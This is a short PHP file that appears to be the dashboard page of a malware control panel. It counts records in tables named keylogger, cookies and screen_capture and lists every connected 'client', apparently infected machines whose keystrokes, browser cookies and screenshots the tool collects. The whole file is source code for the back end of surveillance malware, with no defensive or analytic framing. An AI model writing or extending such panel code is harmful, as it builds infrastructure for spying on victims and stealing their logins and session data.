<?php
require_once ('includes/functions.php');


$login = new Login();
$template = new Template();


if (!$login->loggedIn()) {
$template->showLogin();
}



$template->showHeader("Dashboard");

$keylogger = $db->single("SELECT COUNT(*) FROM keylogger");
$cookies = $db->single("SELECT COUNT(*) FROM cookies");
$screens = $db->single("SELECT COUNT(*) FROM screen_capture");


$clients = $db->query("SELECT * FROM clients ORDER BY id DESC");

$data["keylogger"] = $keylogger;
$data["cookies"] = $cookies;
$data["screens"] = $screens;

$data["clientsCount"] = count($clients);
$data["clients"] = $clients;

$template->showIndex($data);

$template->showFooter();

?>